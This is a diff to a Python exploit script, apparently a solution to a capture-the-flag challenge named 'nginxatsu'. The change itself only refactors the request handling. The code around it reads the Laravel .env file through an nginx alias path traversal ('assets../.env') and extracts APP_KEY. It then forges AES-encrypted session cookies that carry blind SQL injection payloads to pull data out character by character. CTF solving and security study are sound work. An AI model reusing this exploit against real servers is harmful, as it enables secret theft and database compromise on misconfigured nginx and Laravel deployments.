@@ -19,6 +19,14 @@ from time import sleep
 BASE_URL = 'http://<nginxatsu_ip>:<port>/'
 MAX_THRDS = 15 # If character overlap occurs decrease the MAX_THRDS int
 
+def get_req(session, url):
+	try:
+		r = session.get(url)
+	except ConnectionResetError as e:
+		print('Error sending GET request to CTF server:', e)
+		exit(1)
+	return r
+
 class Aes:
 	def __init__(self, key):
 		self.key = key
@@ -34,6 +42,7 @@ class Aes:
 
 class cookie_bsqli:
 	def __init__(self):
+		self.url = BASE_URL
 		self.session = requests.session()
 		self.aes = Aes(self.__get_key())
 		self.cookie_dict, self.cookie_id = self.__decode_cookie()
@@ -41,12 +50,8 @@ class cookie_bsqli:
 		self.exfil_data = {}
 
 	def __get_key(self):
-		try:
-			self.session.get(BASE_URL)
-		except ConnectionResetError as e:
-			print('Error sending GET request to CTF server:', e)
-			exit(1)
-		env_data = self.session.get(BASE_URL+'assets../.env').text
+		get_req(self.session, self.url)
+		env_data = get_req(self.session, self.url+'assets../.env').text
 		key_pattern = 'APP_KEY=base64:'
 		app_key_start = env_data.find(key_pattern)+len(key_pattern)
 		key_str = env_data[app_key_start:app_key_start+44]
@@ -128,11 +133,7 @@ class cookie_bsqli:
 		Now set the current session cookie's to our injected cookie + nginxatsu_session
 		"""
 		self.session.cookies.set(self.cookie_id, b64_cookie_payload, domain=re.split("//|:", BASE_URL)[2])
-		try:
-			r = self.session.get(BASE_URL+'api/configs/')
-		except ConnectionResetError as e:
-			print('Error sending payload/GET request to CTF server:', e)
-			exit(1)
+		r = get_req(self.session, self.url+'api/configs/')
 		if r.status_code == 200 and ch:
 			if type(ch) == int:
 				found_ch = chr(ch)
